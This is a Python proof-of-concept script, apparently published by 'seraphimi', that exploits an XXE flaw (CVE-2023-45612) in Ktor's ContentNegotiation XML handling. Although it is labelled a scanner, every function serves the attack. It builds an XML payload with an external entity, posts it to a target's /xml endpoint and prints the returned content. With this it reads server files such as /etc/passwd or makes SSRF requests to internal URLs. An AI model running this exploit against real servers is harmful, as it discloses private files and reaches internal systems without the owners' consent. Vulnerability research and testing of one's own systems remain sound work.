#!/usr/bin/env python3
"""
XXE Scanner for CVE-2023-45612
by seraphimi
"""

import requests
import argparse
import sys

def banner():
    print("""
    ███████╗███████╗██████╗  █████╗ ██████╗ ██╗  ██╗██╗███╗   ███╗██╗
    ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║  ██║██║████╗ ████║██║
    ███████╗█████╗  ██████╔╝███████║██████╔╝███████║██║██╔████╔██║██║
    ╚════██║██╔══╝  ██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║██║╚██╔╝██║██║
    ███████║███████╗██║  ██║██║  ██║██║     ██║  ██║██║██║ ╚═╝ ██║██║
    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝
    
    XXE Vulnerability Scanner - CVE-2023-45612
    Ktor ContentNegotiation XML Exploit
    ---
    """)

def check_server(server):
    print(f"[*] Checking {server}...")
    try:
        r = requests.get(f"{server}/xml", timeout=3)
        print(f"[+] Server is up\n")
        return True
    except:
        print(f"[-] Can't reach server\n")
        return False

def test_xxe(server, target, is_url=False):
    entity = target if is_url else f"file://{target}"
    attack_type = "SSRF" if is_url else "File Read"
    
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "{entity}">]>
<Message>
    <text>&xxe;</text>
</Message>"""
    
    print(f"[*] Testing {attack_type}: {target}")
    
    try:
        r = requests.post(
            f"{server}/xml",
            data=payload,
            headers={"Content-Type": "application/xml"},
            timeout=10
        )
        
        if r.status_code == 200 and len(r.text) > 30:
            print(f"[!] VULNERABLE!\n")
            print("Response:")
            print("-" * 60)
            print(r.text[:400])
            if len(r.text) > 400:
                print(f"... ({len(r.text)} chars total)")
            print("-" * 60 + "\n")
            return True
        else:
            print(f"[-] Blocked (status: {r.status_code})\n")
            return False
            
    except Exception as e:
        print(f"[-] Failed: {e}\n")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="seraphimi's XXE scanner for CVE-2023-45612"
    )
    
    parser.add_argument("server", help="Target server (http://localhost:8080)")
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--file", help="File to read (/etc/passwd)")
    group.add_argument("--url", help="URL for SSRF (http://internal/)")
    
    args = parser.parse_args()
    
    banner()
    
    server = args.server.rstrip('/')
    
    if not check_server(server):
        sys.exit(1)
    
    if args.file:
        vulnerable = test_xxe(server, args.file, is_url=False)
    else:
        vulnerable = test_xxe(server, args.url, is_url=True)
    
    print("\n" + "="*60)
    if vulnerable:
        print("[!!!] Server is vulnerable")
    else:
        print("[+] No vulnerability detected")
    print("="*60 + "\n")
    
    sys.exit(1 if vulnerable else 0)

if __name__ == "__main__":
    main()
